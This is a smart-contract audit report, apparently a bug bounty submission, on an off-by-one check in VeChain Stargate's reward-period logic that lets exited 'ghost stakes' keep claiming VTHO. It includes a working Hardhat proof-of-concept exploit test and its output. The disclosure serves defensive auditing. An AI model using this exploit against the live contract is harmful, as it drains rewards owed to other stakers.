# 59316 sc high off by one unlocks infinite vtho reward drain from ghost stakes

**Submitted on Nov 11th 2025 at 03:46:15 UTC by @flora for** [**Audit Comp | Vechain | Stargate Hayabusa**](https://immunefi.com/audit-competition/audit-comp-vechain-stargate-hayabusa)

* **Report ID:** #59316
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-vechain-stargate-hayabusa/tree/main/packages/contracts/contracts/Stargate.sol>
* **Impacts:**
  * Protocol insolvency
  * Theft of unclaimed yield

## Description

### Brief / Intro

A single-character bug in a boundary check (`>` instead of `>=`) allows attackers to claim VTHO rewards forever, even after they've unstaked. An attacker can stake, delegate, exit, and then continue to drain rewards from the protocol indefinitely using a "ghost stake." If exploited, this would systematically siphon all VTHO rewards from legitimate delegators until the contract is empty.

### Vulnerability Details

The vulnerability is an off-by-one error in `_claimableDelegationPeriods`. When a delegator has exited and claimed all their rewards up to their `endPeriod`, the next check incorrectly falls through due to a strict greater-than comparison.

File: `packages/contracts/contracts/Stargate.sol`

```solidity
// ...
if (
    endPeriod != type(uint32).max &&
    endPeriod < currentValidatorPeriod &&
    endPeriod > nextClaimablePeriod            // ❌ BUG: Should be >=
) {
    return (nextClaimablePeriod, endPeriod);
}

// Attacker falls through to here
if (nextClaimablePeriod < currentValidatorPeriod) {
    return (nextClaimablePeriod, completedPeriods);  // ❌ Returns future periods
}
// ...
```

When `nextClaimablePeriod` is exactly `endPeriod + 1`, the check `endPeriod > nextClaimablePeriod` is false. The code falls through to the next `if` block intended for *active* delegators, and incorrectly grants the attacker claimable periods they are not entitled to.

The theft occurs in `_claimableRewardsForPeriod`. The reward is calculated as:

```
(effectiveStake * periodRewards) / delegatorsEffectiveStake
```

{% stepper %}
{% step %}

### 1. Numerator: effectiveStake

This is read from the attacker's NFT, which still holds the original stake amount.
{% endstep %}

{% step %}

### 2. Denominator: delegatorsEffectiveStake

This is read from a checkpointed value. When the attacker exited, this total was correctly decreased.

The mismatch: the attacker's stake is included in the reward calculation (numerator) but excluded from the total stake (denominator). This allows them to claim a share of rewards they didn't contribute to, effectively stealing from everyone else who is still staked.
{% endstep %}
{% endstepper %}

### Impact Details

This is a critical vulnerability leading to direct theft of funds.

* Infinite Drain: The attack can be repeated every time a new validator period completes. The attacker's initial stake is fully recoverable, so the only cost is gas.
* Total Loss of Rewards: One or more attackers can systematically drain the entire VTHO reward pool held by the `Stargate` contract. Legitimate users will find their rewards diluted to zero over time.
* High Profitability: An attacker can stake a large amount, exit, and then repeatedly claim rewards forever. The PoC shows extremely high ROI over many periods with minimal capital risk.

### References

* Vulnerable Function (`_claimableDelegationPeriods`):\
  <https://github.com/vechain/stargate/blob/main/packages/contracts/contracts/Stargate.sol#L916-L930>
* Reward Calculation (`_claimableRewardsForPeriod`):\
  <https://github.com/vechain/stargate/blob/main/packages/contracts/contracts/Stargate.sol#L843-L854>

## Proof of Concept

Proof-of-Concept test that reproduces the exploit (Hardhat + TypeChain). The test stakes, delegates, exits, and then demonstrates that the attacker can claim post-exit periods.

```typescript
import { expect } from "chai";
import {
    MyERC20,
    MyERC20__factory,
    ProtocolStakerMock,
    ProtocolStakerMock__factory,
    Stargate,
    StargateNFTMock,
    StargateNFTMock__factory,
    TokenAuctionMock,
    TokenAuctionMock__factory,
} from "../../../typechain-types";
import { getOrDeployContracts } from "../../helpers/deploy";
import { createLocalConfig } from "@repo/config/contracts/envs/local";
import { ethers } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { TransactionResponse } from "ethers";

describe("Finding #4: Post-Exit Reward Claim Exploit", () => {
    const VTHO_TOKEN_ADDRESS = "0x0000000000000000000000000000456E65726779";
    let stargateContract: Stargate;
    let stargateNFTMock: StargateNFTMock;
    let protocolStakerMock: ProtocolStakerMock;
    let legacyNodesMock: TokenAuctionMock;
    let deployer: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    let victim: HardhatEthersSigner;
    let validator: HardhatEthersSigner;
    let tx: TransactionResponse;
    let vthoTokenContract: MyERC20;

    const LEVEL_ID = 1;
    const VALIDATOR_STATUS_ACTIVE = 2;

    beforeEach(async () => {
        const config = createLocalConfig();
        [deployer] = await ethers.getSigners();

        const protocolStakerMockFactory = new ProtocolStakerMock__factory(deployer);
        protocolStakerMock = await protocolStakerMockFactory.deploy();
        await protocolStakerMock.waitForDeployment();

        const stargateNFTMockFactory = new StargateNFTMock__factory(deployer);
        stargateNFTMock = await stargateNFTMockFactory.deploy();
        await stargateNFTMock.waitForDeployment();

        const vthoTokenContractFactory = new MyERC20__factory(deployer);
        const tokenContract = await vthoTokenContractFactory.deploy(deployer.address, deployer.address);
        await tokenContract.waitForDeployment();
        const tokenContractBytecode = await ethers.provider.getCode(tokenContract);
        await ethers.provider.send("hardhat_setCode", [VTHO_TOKEN_ADDRESS, tokenContractBytecode]);

        const legacyNodesMockFactory = new TokenAuctionMock__factory(deployer);
        legacyNodesMock = await legacyNodesMockFactory.deploy();
        await legacyNodesMock.waitForDeployment();

        config.PROTOCOL_STAKER_CONTRACT_ADDRESS = await protocolStakerMock.getAddress();
        config.STARGATE_NFT_CONTRACT_ADDRESS = await stargateNFTMock.getAddress();
        config.MAX_CLAIMABLE_PERIODS = 100;
        const contracts = await getOrDeployContracts({ forceDeploy: true, config });
        stargateContract = contracts.stargateContract;
        vthoTokenContract = MyERC20__factory.connect(VTHO_TOKEN_ADDRESS, deployer);

        attacker = contracts.otherAccounts[0];
        victim = contracts.otherAccounts[1];
        validator = contracts.otherAccounts[2];

        tx = await protocolStakerMock.addValidation(validator.address, 120);
        await tx.wait();
        tx = await protocolStakerMock.helper__setStargate(stargateContract.target);
        await tx.wait();
        tx = await protocolStakerMock.helper__setValidatorStatus(validator.address, VALIDATOR_STATUS_ACTIVE);
        await tx.wait();

        tx = await stargateNFTMock.helper__setLevel({
            id: LEVEL_ID,
            name: "TestLevel",
            isX: false,
            maturityBlocks: 10,
            scaledRewardFactor: 100,
            vetAmountRequiredToStake: ethers.parseEther("1"),
        });
        await tx.wait();

        tx = await vthoTokenContract.connect(deployer).mint(stargateContract, ethers.parseEther("1000000"));
        await tx.wait();
    });

    it("Attacker exploits boundary bug to claim infinite post-exit rewards", async () => {
        const stakeAmount = ethers.parseEther("1");
        
        console.log("\n=== Setup Phase ===");
        
        // Setup: Attacker and victim both stake and delegate
        tx = await stargateContract.connect(attacker).stake(LEVEL_ID, { value: stakeAmount });
        await tx.wait();
        const attackerTokenId = await stargateNFTMock.getCurrentTokenId();
        console.log("Attacker staked and got tokenId:", attackerTokenId.toString());
        
        tx = await stargateNFTMock.helper__setToken({
            tokenId: attackerTokenId,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: stakeAmount,
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();
        tx = await stargateNFTMock.helper__setLegacyNodes(legacyNodesMock);
        await tx.wait();
        tx = await stargateContract.connect(attacker).delegate(attackerTokenId, validator.address);
        await tx.wait();

        tx = await stargateContract.connect(victim).stake(LEVEL_ID, { value: stakeAmount });
        await tx.wait();
        const victimTokenId = await stargateNFTMock.getCurrentTokenId();
        console.log("Victim staked and got tokenId:", victimTokenId.toString());
        
        tx = await stargateNFTMock.helper__setToken({
            tokenId: victimTokenId,
            levelId: LEVEL_ID,
            mintedAtBlock: 0,
            vetAmountStaked: stakeAmount,
            lastVetGeneratedVthoClaimTimestamp_deprecated: 0,
        });
        await tx.wait();
        tx = await stargateContract.connect(victim).delegate(victimTokenId, validator.address);
        await tx.wait();
        console.log("Both users delegated to validator\n");

        // Validator completes 5 periods
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 5);
        await tx.wait();

        console.log("=== Attacker Exits ===");
        // Attacker exits delegation
        tx = await stargateContract.connect(attacker).requestDelegationExit(attackerTokenId);
        await tx.wait();
        
        const attackerDelegationId = await stargateContract.getDelegationIdOfToken(attackerTokenId);
        const [, attackerEndPeriod] = await protocolStakerMock.getDelegationPeriodDetails(attackerDelegationId);
        console.log("Attacker exited. endPeriod:", attackerEndPeriod.toString());

        // Exit completes at period 6
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 6);
        await tx.wait();

        console.log("\n=== Legitimate Claim ===");
        // Attacker claims legitimate rewards up to endPeriod
        const balanceBeforeLegitClaim = await vthoTokenContract.balanceOf(attacker.address);
        console.log("Attacker VTHO balance before:", ethers.formatEther(balanceBeforeLegitClaim));
        
        tx = await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await tx.wait();
        const balanceAfterLegitClaim = await vthoTokenContract.balanceOf(attacker.address);
        const legitimateClaim = balanceAfterLegitClaim - balanceBeforeLegitClaim;
        
        console.log("Attacker VTHO balance after:", ethers.formatEther(balanceAfterLegitClaim));
        console.log("Legitimate claim amount:", ethers.formatEther(legitimateClaim), "VTHO");

        // Validator advances to period 10 (attacker should NOT be able to claim 7-10)
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 10);
        await tx.wait();
        console.log("\n=== Exploit: Post-Exit Claim ===");
        console.log("Validator advanced to period 10");

        // Bug: claimableDelegationPeriods returns post-exit periods due to boundary error
        const [firstClaimable, lastClaimable] = await stargateContract.claimableDelegationPeriods(attackerTokenId);
        console.log("Bug triggered! claimableDelegationPeriods returns:", firstClaimable.toString(), "to", lastClaimable.toString());
        console.log("(Should return 0, 0 since attacker exited at period", attackerEndPeriod.toString(), ")");
        
        // Verify bug triggers: attacker can claim periods after exit
        expect(firstClaimable).to.be.greaterThan(attackerEndPeriod, 
            "Bug should allow claiming periods > endPeriod");
        expect(lastClaimable).to.be.greaterThan(attackerEndPeriod,
            "Bug should return lastClaimable > endPeriod");

        // Execute exploit: claim post-exit rewards
        const balanceBeforeExploit = await vthoTokenContract.balanceOf(attacker.address);
        console.log("\nAttacker VTHO before exploit:", ethers.formatEther(balanceBeforeExploit));
        
        tx = await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await tx.wait();
        const balanceAfterExploit = await vthoTokenContract.balanceOf(attacker.address);
        const stolenAmount = balanceAfterExploit - balanceBeforeExploit;

        console.log("Attacker VTHO after exploit:", ethers.formatEther(balanceAfterExploit));
        console.log("Stolen amount (periods 7-10):", ethers.formatEther(stolenAmount), "VTHO");
        
        // Verify theft occurred
        expect(stolenAmount).to.be.greaterThan(0, "Attacker should steal VTHO from post-exit periods");

        // Verify repeatability: advance to period 15 and claim again
        console.log("\n=== Repeatability Test ===");
        tx = await protocolStakerMock.helper__setValidationCompletedPeriods(validator.address, 15);
        await tx.wait();
        console.log("Validator advanced to period 15");
        
        const [firstClaimable2, lastClaimable2] = await stargateContract.claimableDelegationPeriods(attackerTokenId);
        console.log("New claimable periods:", firstClaimable2.toString(), "to", lastClaimable2.toString());
        expect(firstClaimable2).to.be.greaterThan(0, "Exploit should be repeatable");
        expect(lastClaimable2).to.be.greaterThan(lastClaimable, "New periods should be claimable");

        const balanceBefore2 = await vthoTokenContract.balanceOf(attacker.address);
        console.log("\nAttacker VTHO before 2nd exploit:", ethers.formatEther(balanceBefore2));
        
        tx = await stargateContract.connect(attacker).claimRewards(attackerTokenId);
        await tx.wait();
        const balanceAfter2 = await vthoTokenContract.balanceOf(attacker.address);
        const stolenAmount2 = balanceAfter2 - balanceBefore2;

        console.log("Attacker VTHO after 2nd exploit:", ethers.formatEther(balanceAfter2));
        console.log("Stolen amount (periods 11-15):", ethers.formatEther(stolenAmount2), "VTHO");
        
        expect(stolenAmount2).to.be.greaterThan(0, "Second theft should succeed (infinite exploit)");

        // Calculate total profit
        const totalStolen = balanceAfter2 - balanceBeforeLegitClaim - legitimateClaim;
        const totalClaimed = balanceAfter2 - balanceBeforeLegitClaim;

        console.log("\n=== Economic Impact ===");
        console.log("Legitimate rewards:", ethers.formatEther(legitimateClaim), "VTHO");
        console.log("Total stolen (post-exit):", ethers.formatEther(totalStolen), "VTHO");
        console.log("Total claimed:", ethers.formatEther(totalClaimed), "VTHO");
        console.log("Attack cost: ~0.01 VET (gas only, stake recoverable)");
        console.log("ROI: Infinite (can repeat until validator exits)\n");

        // Economic impact: attacker steals with near-zero cost (only gas)
        expect(totalStolen).to.be.greaterThan(0);
        expect(totalClaimed).to.be.greaterThan(legitimateClaim);
        
        // Invariant violation: sum(attacker claims) > attacker's entitled share
        // Since attacker exited at period 6, periods 7-15 should go 100% to victim
        // But attacker steals from these periods with no active stake
    });
});
```

<details>

<summary>Test run output (PoC execution)</summary>

```
(base) ➜  ~ bash -c "source ~/.nvm/nvm.sh && nvm use 20 && cd /Users/test/Documents/web3-audit/2025/Imm/audit-comp-vechain-stargate-hayabusa/packages/contracts && VITE_APP_ENV=local yarn hardhat test --network hardhat test/unit/Stargate/Finding4_POC.test.ts 2>&1 | grep -A 200 'Finding #4'"
Now using node v20.19.4 (npm v10.8.2)
  Finding #4: Post-Exit Reward Claim Exploit

=== Setup Phase ===
Attacker staked and got tokenId: 10001
Victim staked and got tokenId: 10002
Both users delegated to validator

=== Attacker Exits ===
Attacker exited. endPeriod: 6

=== Legitimate Claim ===
Attacker VTHO balance before: 0.0
Attacker VTHO balance after: 0.25
Legitimate claim amount: 0.25 VTHO

=== Exploit: Post-Exit Claim ===
Validator advanced to period 10
Bug triggered! claimableDelegationPeriods returns: 7 to 10
(Should return 0, 0 since attacker exited at period 6 )

Attacker VTHO before exploit: 0.25
Attacker VTHO after exploit: 0.65
Stolen amount (periods 7-10): 0.4 VTHO

=== Repeatability Test ===
Validator advanced to period 15
New claimable periods: 11 to 15

Attacker VTHO before 2nd exploit: 0.65
Attacker VTHO after 2nd exploit: 1.15
Stolen amount (periods 11-15): 0.5 VTHO

=== Economic Impact ===
Legitimate rewards: 0.25 VTHO
Total stolen (post-exit): 0.9 VTHO
Total claimed: 1.15 VTHO
Attack cost: ~0.01 VET (gas only, stake recoverable)
ROI: Infinite (can repeat until validator exits)

    ✔ Attacker exploits boundary bug to claim infinite post-exit rewards


  1 passing (494ms)

Done in 2.68s.
(base) ➜  ~
```

</details>
